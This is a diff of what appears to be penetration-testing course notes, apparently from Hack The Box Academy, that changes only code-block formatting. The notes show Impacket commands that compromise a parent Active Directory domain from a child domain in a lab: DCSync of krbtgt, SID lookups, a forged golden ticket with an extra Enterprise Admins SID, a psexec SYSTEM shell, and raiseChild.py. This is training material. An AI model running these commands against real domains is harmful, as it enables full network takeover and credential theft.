@@ -14,8 +14,7 @@ Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCA
 
 #### Performing DCSync with secretsdump.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
@@ -35,8 +34,7 @@ Next, we can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/
 
 #### Performing SID Brute Forcing using lookupsid.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -74,8 +72,7 @@ We can filter out the noise by piping the command output to grep and looking for
 
 #### Looking for the Domain SID
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
 
 Password:
@@ -87,8 +84,7 @@ Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (D
 
 #### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
 
 Password:
@@ -119,8 +115,7 @@ Next, we can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/m
 
 #### Constructing a Golden Ticket using ticketer.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
@@ -143,8 +138,7 @@ The ticket will be saved down to our system as a [credential cache (ccache)](htt
 
 #### Setting the KRB5CCNAME Environment Variable
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ export KRB5CCNAME=hacker.ccache
 ```
 
@@ -152,8 +146,7 @@ We can check if we can successfully authenticate to the parent domain's Domain C
 
 #### Getting a SYSTEM shell using Impacket's psexec.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
@@ -187,8 +180,7 @@ Finally, if the `target-exec` switch is specified, it authenticates to the paren
 
 #### Performing the Attack with raiseChild.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
@@ -231,8 +223,7 @@ C:\Windows\system32>exit
 
 The script lists out the workflow and process in a comment as follows:
 
-```
-        python
+```python
 #   The workflow is as follows:
 #       Input:
 #           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
